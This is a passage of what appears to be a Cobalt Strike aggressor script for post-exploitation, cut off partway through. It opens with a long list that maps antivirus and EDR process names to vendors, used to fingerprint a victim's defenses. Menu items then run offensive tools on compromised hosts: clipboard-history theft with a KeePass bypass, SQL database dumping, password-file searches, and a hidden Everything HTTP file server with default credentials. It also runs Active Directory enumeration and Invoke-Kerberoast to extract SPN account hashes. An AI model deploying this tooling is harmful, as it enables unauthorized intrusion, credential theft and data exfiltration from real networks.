				"protectx.exe" => "ProtectX",
				"pspf.exe" => "Known anti-software process, the name is not included yet",
				"purge.exe" => "Known anti-software process, the name is not included yet",
				"qconsole.exe" => "Norton AntiVirus Quarantine Console",
				"qserver.exe" => "Norton Internet Security",
				"rapapp.exe" => "BlackICE",
				"rb32.exe" => "RapidBlaster",
				"rcsync.exe" => "PrizeSurfer",
				"realmon.exe" => "Realmon ",
				"rescue.exe" => "Known anti-software process, the name is not included yet",
				"rescue32.exe" => "Kaspersky Internet Security",
				"rshell.exe" => "Known anti-software process, the name is not included yet",
				"rtvscn95.exe" => "Real-time virus scanner",
				"rulaunch.exe" => "McAfee User Interface",
				"run32dll.exe" => "PAL PC Spy",
				"safeweb.exe" => "PSafe Tecnologia",
				"sbserv.exe" => "Norton Antivirus",
				"scrscan.exe" => "360 antivirus",
				"sfc.exe" => "System file checker",
				"sh.exe" => "MKS Toolkit for Win3",
				"showbehind.exe" => "MicroSmarts Enterprise Component",
				"soap.exe" => "System Soap Pro",
				"sofi.exe" => "Known anti-software process, the name is not included yet",
				"sperm.exe" => "Known anti-software process, the name is not included yet",
				"supporter5.exe" => "eScorcher anti-virus",
				"symproxysvc.exe" => "Symantec",
				"symtray.exe" => "Symantec",
				"tbscan.exe" => "ThunderBYTE",
				"tc.exe" => "TimeCalende",
				"titanin.exe" => "TitanHide",
				"tvmd.exe" => "Total Velocity",
				"tvtmd.exe" => "Total Velocity",
				"vettray.exe" => "eTrust",
				"vir-help.exe" => "Known anti-software process, the name is not included yet",
				"vnpc3000.exe" => "Known anti-software process, the name is not included yet",
				"vpc32.exe" => "Symantec",
				"vpc42.exe" => "Symantec",
				"vshwin32.exe" => "McAfee",
				"vsmain.exe" => "McAfee",
				"vsstat.exe" => "McAfee",
				"wfindv32.exe" => "Known anti-software process, the name is not included yet",
				"zapro.exe" => "Zone Alarm",
				"zonealarm.exe" => "Zone Alarm",
				"AVPM.exe" => "Kaspersky",
				"A2CMD.exe" => "Emsisoft Anti-Malware",
				"A2SERVICE.exe" => "a-squared free",
				"A2FREE.exe" => "a-squared Free",
				"ADVCHK.exe" => "Norton AntiVirus",
				"AGB.exe" => "Antian Line of Defense",
				"AHPROCMONSERVER.exe" => "Antian Line of Defense",
				"AIRDEFENSE.exe" => "AirDefense",
				"ALERTSVC.exe" => "Norton AntiVirus",
				"AVIRA.exe" => "Little Red Umbrella Antivirus",
				"AMON.exe" => "Tiny Personal Firewall",
				"AVZ.exe" => "AVZ",
				"ANTIVIR.exe" => "Known antivirus process, the name is not included yet",
				"APVXDWIN.exe" => "Panda Guardian",
				"ASHMAISV.exe" => "Alwil",
				"ASHSERV.exe" => "Avast Anti-virus",
				"ASHSIMPL.exe" => "AVAST!VirusCleaner",
				"ASHWEBSV.exe" => "Avast",
				"ASWUPDSV.exe" => "Avast",
				"ASWSCAN.exe" => "Avast",
				"AVCIMAN.exe" => "Panda Guardian",
				"AVCONSOL.exe" => "McAfee",
				"AVENGINE.exe" => "Panda Guardian",
				"AVESVC.exe" => "Avira AntiVir Security Service",
				"AVEVL32.exe" => "Known anti-software process, the name is not included yet",
				"AVGAM.exe" => "AVG",
				"AVGCC.exe" => "AVG",
				"AVGCHSVX.exe" => "AVG",
				"AVGCSRVX" => "AVG",
				"AVGNSX.exe" => "AVG",
				"AVGCC32.exe" => "AVG",
				"AVGCTRL.exe" => "AVG",
				"AVGEMC.exe" => "AVG",
				"AVGFWSRV.exe" => "AVG",
				"AVGNTMGR.exe" => "AVG",
				"AVGSERV.exe" => "AVG",
				"AVGTRAY.exe" => "AVG",
				"AVGUPSVC.exe" => "AVG",
				"AVINITNT.exe" => "Command AntiVirus for NT Server",
				"AVPCC.exe" => "Kaspersky",
				"AVSERVER.exe" => "Kerio MailServer",
				"AVSCHED32.exe" => "H+BEDV",
				"AVSYNMGR.exe" => "McAfee",
				"AVWUPSRV.exe" => "H+BEDV",
				"BDSWITCH.exe" => "BitDefender Module",
				"BLACKD.exe" => "BlackICE",
				"CCEVTMGR.exe" => "Symantec",
				"CFP.exe" => "COMODO",
				"CLAMWIN.exe" => "ClamWin Portable",
				"CUREIT.exe" => "DrWeb CureIT",
				"DEFWATCH.exe" => "Norton Antivirus",
				"DRWADINS.exe" => "Dr. Web",
				"DRWEB.exe" => "Dr. Web",
				"DEFENDERDAEMON.exe" => "ShadowDefender",
				"EWIDOCTRL.exe" => "Ewido Security Suite",
				"EZANTIVIRUSREGISTRATIONCHECK.exe" => "e-Trust Antivirus",
				"FIREWALL.exe" => "Ashampoo Software",
				"FPROTTRAY.exe" => "F-PROT Antivirus",
				"FPWIN.exe" => "Verizon",
				"FRESHCLAM.exe" => "ClamAV",
				"FSAV32.exe" => "F-Secure",
				"FSBWSYS.exe" => "F-secure",
				"FSDFWD.exe" => "F-Secure",
				"FSGK32.exe" => "F-Secure",
				"FSGK32ST.exe" => "F-Secure",
				"FSMA32.exe" => "F-Secure",
				"FSMB32.exe" => "F-Secure",
				"FSSM32.exe" => "F-Secure",
				"GUARDGUI.exe" => "Online Game Bodyguard",
				"GUARDNT.exe" => "IKARUS",
				"IAMAPP.exe" => "Symantec",
				"INOCIT.exe" => "eTrust",
				"INORPC.exe" => "eTrust",
				"INORT.exe" => "eTrust",
				"INOTASK.exe" => "eTrust",
				"INOUPTNG.exe" => "eTrust",
				"ISAFE.exe" => "eTrust",
				"KAV.exe" => "Kaspersky",
				"KAVMM.exe" => "Kaspersky",
				"KAVPF.exe" => "Kaspersky",
				"KAVPFW.exe" => "Kaspersky",
				"KAVSTART.exe" => "Kaspersky",
				"KAVSVC.exe" => "Kaspersky",
				"KAVSVCUI.exe" => "Kaspersky",
				"KMAILMON.exe" => "KMAILMON",
				"MCAGENT.exe" => "McAfee",
				"MCMNHDLR.exe" => "McAfee",
				"MCREGWIZ.exe" => "McAfee",
				"MCUPDATE.exe" => "McAfee",
				"MCVSSHLD.exe" => "McAfee",
				"MINILOG.exe" => "Zone Alarm",
				"MYAGTSVC.exe" => "McAfee",
				"MYAGTTRY.exe" => "McAfee",
				"NAVAPSVC.exe" => "Norton",
				"NAVAPW32.exe" => "Norton",
				"NAVLU32.exe" => "Norton",
				"NAVW32.exe" => "Norton Antivirus",
				"NEOWATCHLOG.exe" => "NeoWatch",
				"NEOWATCHTRAY.exe" => "NeoWatch",
				"NISSERV.exe" => "Norton",
				"NISUM.exe" => "Norton",
				"NMAIN.exe" => "Norton",
				"NOD32.exe" => "ESET NOD32",
				"NPFMSG.exe" => "Norman Personal Firewall",
				"NPROTECT.exe" => "Symantec",
				"NSMDTR.exe" => "Norton",
				"NTRTSCAN.exe" => "Trend Micro",
				"OFCPFWSVC.exe" => "OfficeScanNT",
				"ONLINENT.exe" => "Known anti-software process, the name is not included yet",
				"OP_MON.exe" => "Outpost Firewall",
				"PAVFIRES.exe" => "Panda Guardian",
				"PAVFNSVR.exe" => "Panda Guardian",
				"PAVKRE.exe" => "Panda Guardian",
				"PAVPROT.exe" => "Panda Guard",
				"PAVPROXY.exe" => "Panda Guardian",
				"PAVPRSRV.exe" => "Panda Guardian",
				"PAVSRV51.exe" => "Panda Guardian",
				"PAVSS.exe" => "Panda Guardian",
				"PCCGUIDE.exe" => "PC-cillin",
				"PCCIOMON.exe" => "PC-cillin",
				"PCCNTMON.exe" => "PC-cillin",
				"PCCPFW.exe" => "Trend Micro",
				"PCCTLCOM.exe" => "Trend Micro",
				"PCTAV.exe" => "PC Tools AntiVirus",
				"PERSFW.exe" => "Tiny Personal Firewall",
				"PERVAC.exe" => "Known anti-software process, the name is not included yet",
				"PESTPATROL.exe" => "Ikarus",
				"PREVSRV.exe" => "Panda Guardian",
				"RTVSCN95.exe" => "Real-time Virus Scanner",
				"SAVADMINSERVICE.exe" => "SAV",
				"SAVMAIN.exe" => "SAV",
				"SAVSCAN.exe" => "SAV",
				"SDHELP.exe" => "Spyware Doctor",
				"SHSTAT.exe" => "McAfee",
				"SPBBCSVC.exe" => "Symantec",
				"SPIDERCPL.exe" => "Dr. Web",
				"SPIDERML.exe" => "Dr. Web",
				"SPIDERUI.exe" => "Dr. Web",
				"SPYBOTSD.exe" => "Spybot",
				"SWAGENT.exe" => "SonicWALL",
				"SWDOCTOR.exe" => "SonicWALL",
				"SWNETSUP.exe" => "Sophos",
				"SYMLCSVC.exe" => "Symantec",
				"SYMPROXYSVC.exe" => "Symantec",
				"SYMSPORT.exe" => "Sysmantec",
				"SYMWSC.exe" => "Sysmantec",
				"SYNMGR.exe" => "Sysmantec",
				"TMLISTEN.exe" => "Trend Micro",
				"TMNTSRV.exe" => "Trend Micro",
				"TMPROXY.exe" => "Trend Micro",
				"TNBUTIL.exe" => "Anti-Virus",
				"VBA32ECM.exe" => "Known anti-software process, the name is not included yet",
				"VBA32IFS.exe" => "Known anti-software process, the name is not included yet",
				"VBA32PP3.exe" => "Known anti-software process, the name is not included yet",
				"VCRMON.exe" => "VirusChaser",
				"VRMONNT.exe" => "HAURI",
				"VRMONSVC.exe" => "HAURI",
				"VSHWIN32.exe" => "McAfee",
				"VSSTAT.exe" => "McAfee",
				"XCOMMSVR.exe" => "BitDefender",
				"ZONEALARM.exe" => "Zone Alarm",
				"360rp.exe" => "360 antivirus",
				"afwServ.exe" => "Avast Antivirus",
				"safeboxTray.exe" => "360 antivirus",
				"360safebox.exe" => "360 antivirus",
				"QQPCTray.exe" => "QQ Computer Manager",
				"KSafeTray.exe" => "Kingsoft Antivirus",
				"KSafeSvc.exe" => "Kingsoft Antivirus",
				"KWatch.exe" => "Kingsoft Antivirus",
				"gov_defence_service.exe" => "Cloud lock",
				"gov_defence_daemon.exe" => "Cloud lock",
				"smartscreen.exe" => "Windows Defender",
				"macompatsvc.exe" => "McAfee",
				"mcamnsvc.exe " => "McAfee",
				"masvc.exe" => "McAfee",
				"mfemms.exe" => "McAfee",
				"mctary.exe" => "McAfee",
				"mcshield.exe" => "McAfee",
				"mfewc.exe" => "McAfee",
				"mfewch.exe" => "McAfee",
				"mfefw.exe" => "McAfee",
				"mfefire.exe" => "McAfee",
				"mfetp.exe" => "McAfee",
				"mfecanary.exe" => "McAfee",
				"mfeconsole.exe" => "McAfee",
				"mfeesp.exe" => "McAfee",
				"fcag.exe" => "McAfee",
				"fcags.exe" => "McAfee",
				"fcagswd.exe" => "McAfee",
				"fcagate.exe" => "McAfee",
				"360EntClient.exe" => "Tianqing EDR Agent",
				"edr_sec_plan.exe" => "Sangcon EDR Agent",
				"edr_monitor.exe" => "Sangcon EDR Agent",
				"edr_agent.exe" => "Sangcon EDR Agent",
				"ESCCControl.exe" => "Venus EDR Agent",
				"ESCC.exe" => "Venus EDR Agent",
				"ESAV.exe" => "Venus EDR Agent",
				"ESCCIndex.exe" => "Venus EDR Agent",
				"AliYunDun.exe" => "Aliyun Yundun",
				"wdswfsafe.exe" => "360 Antivirus-Net Shield",
				"TopsecMain.exe" => "Topsec Terminal Defense",
				"TopsecTray.exe" => "Topsec Terminal Defense",
				"YDLive.exe" => "Tencent Cloud-Cloud Mirror",
				"YDService.exe" => "Tencent Cloud-Cloud Mirror",
				"TitanAgent.exe" => "Sky Eye Cloud Mirror",
				"TitanMonitor.exe" => "Tianyan Cloud Mirror",
				"gse_win_daemon.exe" => "Blue Whale Agent",
				"gse_win_agent.exe" => "Blue Whale Agent",
				"QHActiveDefense.exe" => "360 Total Security (360 International Edition)",
				"QHWatchdog.exe" => "360 Total Security (360 International Edition)",
				"QHSafeTray.exe" => "360 Total Security (360 International Edition)",
				"QHSafeMain.exe" => "360 Total Security (360 International Version)"
				);
			bshell($1,"tasklist /SVC && echo AntiVirusCheckComplete");
			$bid = $1;
			on beacon_output {
				$message = $2;
				@array = split(" ",$message);
				@data = remove(@array,"");
				foreach $key => $value (@data){
					@data[$key] = replaceAt($value, "", 0, 2);
				}
				@data = remove(@array,"");
				foreach $key => $value (@data){
					@data[$key] = "\"".$value."\"";
				}
				
				$string1 = "";

				foreach $value (@data){
					$string1 = $string1.$value;
				}
				if("AntiVirusCheckComplete" isin $string1){
					$av = "";
					println("\c8===============================================");
					foreach $key (%sr){
						if ($key isin $string1){
							$av = $av.%sr[$key]." ";
							println("\c8Find antiVirus: ".%sr[$key]." => IPaddress:".binfo($1)['internal']);
						}
					}
				$ip = binfo($1)['internal'];
				%beacon_llist_off[$ip] = $off;
				}else{
					exit();
				}
			}                
			set BEACON_SBAR_LEFT {
				local('$computer $user $pid $barch');
				$beacon_ip = $2['internal'];
				$av_list = %beacon_llist_av[$beacon_ip];
				if ($av_list eq ""){
					%beacon_llist_av[$beacon_ip] = "No antivirus found yet"
				}
				($computer, $user, $pid, $barch) = values($2, @('computer', 'user', 'pid', 'barch'));
				if ("x86" eq $barch) {
					return "[ $+ $computer $+ ] $user $+ / $+ $pid $+ \c4[ $av_list $+ ]";
				}
				else if ("x64" eq $barch) {
					return "[ $+ $computer $+ ] $user $+ / $+ $pid \cE(x64)\o $+ \c4[ $av_list $+ ]";
				}
				else {
					return " $+ \c4[ $av_list $+ ]";
				}
				
			}

		}
	}
	item "Check VM" {
		blog($1, "\c9=========== Check VM (virtual machine detection) ==========");
		local('$bid');
		foreach $bid ($1){
			binput($1, "powershell-import Check-VM.ps1");
			bpowershell_import($1, script_resource("/scripts/InfoCollect/Check-VM.ps1"));
			binput($1, "powershell Check-VM");
			bpowershell($1, "Check-VM");
		}
	}
	item "SharpGetInfo (one-click collection)" {
		blog($1, "\c9=========== SharpGetInfo (one-click collection) ==========");
		bexecute_assembly($1, script_resource('/scripts/InfoCollect/Ladon.exe'), "GetInfo");
	}
	item "SharpListRDP (RDP record)" {
		blog($1, "\c9=========== SharpListRDP (RDP record query) ==========");
		bexecute_assembly($1, script_resource('/scripts/InfoCollect/LRC.exe'));
	}	
	menu "Other host information collection" {
		item "SharpNetCheck (detection net)" {
			blog($1, "\c9=========== SharpNetCheck (detecting the net) ==========");
			$bid = $1['@'];
			$dialog = dialog("SharpNetCheck", %(host => "ceye.io",,type => "all",bid => $bid), &SharpNetCheck);
			dialog_description($dialog,"Echoing the internal network IP address and computer name in Dnslog can realize the rapid positioning of the network-exiting machine in the internal network. Project address: https://github.com/uknowsec/SharpNetCheck");
			drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","-all"));
			drow_text($dialog, "host", "host/ip:  ");
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub SharpNetCheck {
			$arg = join(' ', @($3['type'],"-host",$3['host']));
			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpNetCheck.exe"), $arg);
		}

		item "SharpChassisType (judging host type)" {
			blog($1, "\c9=========== SharpChassisType (judge host type) ==========");
			$bid = $1['@'];
			$dialog = dialog("SharpNetCheck", %(bid => $bid), &SharpChassisType);
			dialog_description($dialog," used to judge the current machine type (desktop computer, notebook, etc.). Project address: https://github.com/RcoIl/CSharp-Tools/");
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub SharpChassisType{
			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpChassisType.exe"), "");
		}


		item "SharpEventLog(get system log log)" {
			blog($1, "\c9=========== SharpEventLog (get system login log) ==========");
			$bid = $1;
			$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
			dialog_description($dialog, "Read all the computer information of failed logins or successful logins (4624, 4625) that have logged in to this machine, and quickly locate operation and maintenance managers during intranet penetration. Project address: https://github.com /uknowsec/SharpEventLog");
			drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub SharpEventLog {
			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpEventLog.exe"), $3['EventLogType']);
		}

		item "SharpCheckInfo (get multiple host information)" {
			blog($1, "\c9=========== SharpCheckInfo (obtain multiple host information) ==========");
			$bid = $1;
			$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
			dialog_description($dialog, "Collect target host information, including recently opened files, system environment variables and recycle bin files, etc. Project address: https://github.com/uknowsec/SharpCheckInfo");
			drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub SharpCheckInfo {
			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpCheckInfo.exe"), $3['Type']);
		}

		item "SharpSQLDump (quickly list database data)" {
			blog($1, "\c9=========== SharpSQLDump (quickly list database data) ==========");
			$bid = $1['@'];
			$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
			dialog_description($dialog, "Quickly obtain all database names, table names, and column names of the database during intranet penetration. After specific judgments, go to the data to save time. Applicable to mysql, mssql. Project address: https://github.com /uknowsec/SharpSQLDump");
			drow_text($dialog, "host", "host:  ");
			drow_text($dialog, "username", "username:  ");
			drow_text($dialog, "password", "password:  ");
			drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub SharpSQLDump {
			$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpSQLDump.exe"), $arg);
		}

		item "SharpClipHistory (get win10 clipboard)" {
			blog($1, "\c9=========== SharpClipHistory (get win10 clipboard) ==========");
			$bid = $1;
			$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpClipHistory);
			dialog_description($dialog, "[Run directly after enabling enableHistory to read] can be used to read the contents of the user's clipboard history in Windows 10 starting from the 1809 Build version. Project address: https://github.com/FSecureLABS/ SharpClipHistory");
			drow_combobox($dialog, "Type", "Type:", @("","--help","--checkOnly","--enableHistory","--saveImages","--keepassBypass"));
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub SharpClipHistory {
			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpClipHistory.exe"), $3['Type']);
		}

		item "SharpAVKB (comparison of antivirus and patch)" {
			blog($1, "\c9=========== SharpAVKB (comparison of antivirus and patch) ==========");
			$bid = $1;
			$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
			dialog_description($dialog, "Windows antivirus comparison and patch number comparison. Project address: https://github.com/uknowsec/SharpAVKB");
			drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub SharpAVKB {
			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpAVKB.exe"), $3['type']);
		}

		item "SharpEDRChecker (get EDR information)" {
			blog($1, "\c9=========== SharpEDRChecker (get EDR information) ==========");
			$bid = $1['@'];
			btask($bid, "Check the running process, process metadata, DLL loaded into the current process and per-DLL metadata, common installation directory, installed services and per-service binary metadata, installed drivers Program and per-driver metadata, all of which exist known defensive products such as AV, EDR, and logging tools. Can also catch hidden EDR through its metadata inspection. Project address: https://github .com/PwnDexter/SharpEDRChecker", "");
			bexecute_assembly($1, script_resource("/scripts/InfoCollect/SharpEDRChecker.exe"), "");
		}
		item "SharpDir(file search)" {
			blog($1, "\c9=========== SharpDir (file search) ==========");
			$bid = $1['@'];
			$dialog = dialog("File Search", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
			dialog_description($dialog, "File search, three search methods, specify file name, specify file name search suffix, search specified suffix file. Project address: https://github.com/jnqpblc/SharpDir");
			drow_text($dialog, "path", "path:  ");
			drow_text($dialog, "file", "file:  ");
			dbutton_action($dialog, "Run");
			dialog_show($dialog);
		}
		sub SharpDir {
			$arg = join(' ', @($3['path'],$3['file']));
			bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpDir.exe"), $arg);
		}

		menu "Everything (build http service file search)" {
			item "Upload Everything" {
			blog($1, "\c9=========== Upload Everything ==========");
				$bid = $1;
				$dialog = dialog("上传 Everything", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &evething);
				dialog_description($dialog, "Run without any pop-up window, software address: https://www.voidtools.com/zh-cn/");
				drow_text($dialog, "UploadPath", "Upload path: ");
				dbutton_action($dialog, "Upload");
				dialog_show($dialog);
			}
			sub evething {
				bcd($bid, $3['UploadPath']);
				bupload($bid, script_resource("/scripts/InfoCollect/everything/Everything.exe"));
				bupload($bid, script_resource("/scripts/InfoCollect/everything/Everything.ini"));
			}

			item "Run Everything" {
				blog($1, "\c9=========== Run Everything ===========");
				$bid = $1['@'];
				$Dialog = dialog("Run Evething",%(bid => $bid),&Evething_run);
				dialog_description($Dialog, "Run without any pop-up window and tray display, automatically enable http service. Port: 65535, user: admin, password: admin@123");
				btask($bid, "Run without any pop-up window and tray display, automatically enable http service. Access web service: http://ip:65535, user: admin, password: admin@123", "");
				dbutton_action($Dialog, "Run");
				dialog_show($Dialog);
			}
			sub Evething_run{
				bshell($bid, "Everything.exe");
			}
			item "Stop Everything" {
				blog($1, "\c9=========== Stop Everything ==========");
				local('$bid');
				foreach $bid ($1){
					bshell($1, "taskkill -f /im Everything.exe");
				}
			}
			item "Delete Everything" {
				blog($1, "\c9============ Delete Everything ==========");
				local('$bid');
				foreach $bid ($1){
					bshell($1, "taskkill -f /im Everything.exe & del /f /s /q Everything.exe & del /f /s /q Everything.ini");
				}
			}
		}
	}
	separator();
	menu "Netview (WinAPI)" {
		item "upload netview" {
		blog($1, "\c9=========== upload netview ==========");
		$bid = $1;
		$dialog = dialog("Upload netview", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &netview);
		dialog_description($dialog, "Netview uses WinAPI to call the enumeration system, and most functions do not require administrator privileges. Project address: https://github.com/mubix/netview");
		drow_text($dialog, "UploadPath", "Upload path: ");
		dbutton_action($dialog, "Upload");
		dialog_show($dialog);
		}
		sub netview {
		bcd($bid, $3['UploadPath']);
		bupload($bid, script_resource("/scripts/InfoCollect/netview.exe"));
		}
		item "run netview" {
		blog($1, "\c9=========== run netview ==========");
		$bid = $1['@'];
		$Dialog = dialog("Run netview",%(domain => "xxx.com",bid => $bid),&netview_run);
		drow_text($Dialog, "domain", "domain: ");
		dbutton_action($Dialog, "Run");
		dialog_show($Dialog);
		}
		sub netview_run{
		local('$Name');
		$Name = $3['domain'];
		bshell($bid, "netview.exe -d  $+ $Name");
		}
		item "delete netview" {
		blog($1, "\c9============ delete netview ==========");
		local('$bid');
		foreach $bid ($1){
			bshell($1, "del /f /s /q netview.exe");
		}
		}
	}

	menu "Powerview 2008 query"{
		item "Upload AD module" {
			blog($1, "\c9=========== Upload AD module==========");
			bupload($bid, script_resource("/scripts/InfoCollect/AD.dll"));
		}
		item "Import Powerview" {
			blog($1, "\c9=========== import Powerview ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				blog2($bid, "powerview import test");
				bpowershell($bid, "Import-Module .\\AD.dll;Get-DomainController");
			}
		}
		item "View the specified user information" {
			blog($1, "\c9=========== View the specified user information ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				$dialog = dialog("View the specified user", %(username => ""), &getuser);
				dialog_description($dialog, "powerview view the information of the specified user");
				drow_text($dialog, "username", "user: ");
				dbutton_action($dialog, "QUERY");
				dialog_show($dialog);
			}
		}

		item "Last bad password attempt for all users" {
			blog($1, "\c9=========== last bad password attempt for all users ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Import-Module .\\AD.dll;get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto");
			}
		}


		item "Query users of a group" {
			blog($1, "\c9===========Query users of a certain group==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				$dialog = dialog("View all users of the specified group", %(groupname => ""), &groupquery);
				dialog_description($dialog, "powerview view all users of the specified group");
				drow_text($dialog, "groupname", "组名: ");
				dbutton_action($dialog, "QUERY");
				dialog_show($dialog);
			}

		}

		item "Domain Control Machine Query" {
			blog($1, "\c9=========== Domain control machine query ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADDomainController -filter * | Select-Object HostName,IPv4Address,OperatingSystem | fl");
			}
		}

		item "Get Domain Level" {
			blog($1, "\c9=========== get field level==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADDomain | Select-Object DNSRoot,PDCEmulator,DomainMode");
			}
		}

		item "Find all computers in the domain and the DNS corresponding to the computer" {
			blog($1, "\c9=========== Find all computers and DNS corresponding to computers in the domain ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADComputer -Filter * -Property Name,IPv4Address | Select-Object DNSHostName,IPv4Address,SID | fl");
			}
		}

		item "Find all users in the domain" {
			blog($1, "\c9=========== Find all users in the domain ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADUser -Filter * | Select-Object Name,ObjectClass,SID | fl");
			}
		}
 
		item "Looking for kerberos service user" {
			blog($1, "\c9=========== Looking for kerberos service users ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADUser -filter {ServicePrincipalName -like \"*\"} -Property * | Select-Object Name,SID,ServicePrincipalNames | fl");
			}
		}

		item "No delegation computer query" {
			blog($1, "\c9=========== No delegation computer query ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADComputer -Filter {TrustedForDelegation -eq \$True} -Properties * | select-object DNSHostName,IPv4Address,KerberosEncryptionType,whenCreated | fl");
			}
		}

		item "Constrained Delegation User Query" {
			blog($1, "\c9=========== constrained delegation user query ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADUser -Filter {TrustedToAuthForDelegation -eq \$True} -Properties * | select-object DistinguishedName,servicePrincipalName,msDS-AllowedToDelegateTo");
			}
		}

		item "Domain users do not require kerberos authentication identity query" {
			blog($1, "\c9=========== domain users do not require kerberos authentication query ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($pid, "Import-Module .\\AD.dll;Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$False} | Select-Object Name,SID | fl");
			}
		}

		item "Get the hash of the specified SPN user" {
			blog($1, "\c9=========== Get the hash of the specified SPN user ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				$dialog = dialog("Get the hash of the specified SPN user", %(spnusername => ""), &spnuserquery);
				dialog_description($dialog, "powerview gets the hash of the specified SPN user");
				drow_text($dialog, "spnusername", "User: ");
				dbutton_action($dialog, "QUERY");
				dialog_show($dialog);
			}
		}

		item "enumerate valuable (high authority group) SPN users" {
			blog($1, "\c9=========== enumerate valuable (high authority group) SPN users ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Import-Module .\\AD.dll;Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon");
			}

		}
		sub moduleimport{
			foreach $bid ($1){
				blog($bid, "Import script: $modulename");
				bpowershell_import($bid, script_resource($modulename));
			}
		}

		sub getuser{
			bpowershell($bid, "Import-Module .\\AD.dll;Get-ADUser -Identity \"$3['username']\"");
		}

		sub groupquery{
			bpowershell($bid, "Import-Module .\\AD.dll;Get-ADGroupMember \'$3['groupname']\' | Select-Object name,objectClass,distinguishedName,SID | fl");
		}

		sub spnuserquery{
			bpowershell($bid, "Import-Module .\\AD.dll;Invoke-Kerberoast -Identity \'$3['spnusername']\' | %{\$_.hash}");
		}
	}

	menu "Powerview 2012 query" {
		item "Import Powerview" {
			blog($1, "\c9=========== import Powerview ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				blog2($bid, "powerview import test");
				bpowershell($bid, "Get-DomainController");
			}
		}
		item "View the specified user information" {
			blog($1, "\c9=========== View the specified user information ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				$dialog = dialog("View the specified user", %(username => ""), &getuser);
				dialog_description($dialog, "powerview view the information of the specified user");
				drow_text($dialog, "username", "user: ");
				dbutton_action($dialog, "QUERY");
				dialog_show($dialog);
			}
		}

		item "Last bad password attempt for all users" {
			blog($1, "\c9=========== last bad password attempt for all users ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
